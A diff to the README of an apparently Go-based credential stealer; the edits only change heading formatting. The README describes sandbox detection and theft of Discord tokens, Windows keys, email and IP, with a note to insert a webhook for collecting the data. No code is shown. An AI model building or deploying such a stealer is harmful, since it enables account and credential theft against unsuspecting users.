@@ -8,7 +8,7 @@
 
 
 
-👻 # **Story on this project** 👻
+👻  **Story on this project** 👻
 
 This is my first golang project, so please be wary of unclean code. Some of the code
 was borrowed from others out of lazyness as of that, there might be some inconsistencies.
@@ -17,10 +17,10 @@ The main objective of writing this wasn't really to grab info but more of a lear
 experience for me. 
 
 
-👺 # **What it does** 👺
+👺  **What it does** 👺
 It first scans its enviroment for sandboxes. Then, it tries to grab the hosts, discord token, windows key, email, and IP
 
-📖 # **FYI**  📖
+📖  **FYI**  📖
 
 In the "main.go" file there is a getwebhook function
 please insert your webhook into the getwebhook function
